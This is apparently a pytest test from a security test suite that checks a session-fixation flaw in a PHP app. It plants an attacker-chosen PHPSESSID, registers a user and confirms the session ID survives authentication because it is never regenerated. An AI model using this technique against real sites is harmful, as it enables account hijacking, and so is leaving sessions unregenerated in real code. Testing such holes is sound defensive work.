import requests

from helpers import current_php_session_id, json_of, me, register, set_php_session_cookie


def test_exploit_vuln_002_session_fixation_on_register(app_instance):
    """
    Exploit expectation:
    If an attacker can pre-set a victim's anonymous PHPSESSID, the same session ID
    remains valid after registration/login because the application does not call
    session_regenerate_id(true).
    """
    base_url = app_instance["base_url"]

    chosen_sid = "fixatedsessionid123456789"
    victim = requests.Session()

    # Simulate attacker-controlled pre-auth session identifier
    set_php_session_cookie(victim, base_url, chosen_sid)

    r = register(victim, base_url, "fix_victim", "pass123", "Fixation Victim")
    assert r.status_code == 201, r.text
    payload = json_of(r)
    assert payload["success"] is True
    assert payload["user"]["username"] == "fix_victim"

    # The key exploit condition: session ID remains unchanged after authentication.
    sid_after = current_php_session_id(victim, base_url)
    assert sid_after == chosen_sid, f"Expected fixed session id to remain unchanged, got {sid_after!r}"

    me_resp = me(victim, base_url)
    assert me_resp.status_code == 200, me_resp.text
    me_payload = json_of(me_resp)
    assert me_payload["success"] is True
    assert me_payload["user"]["username"] == "fix_victim"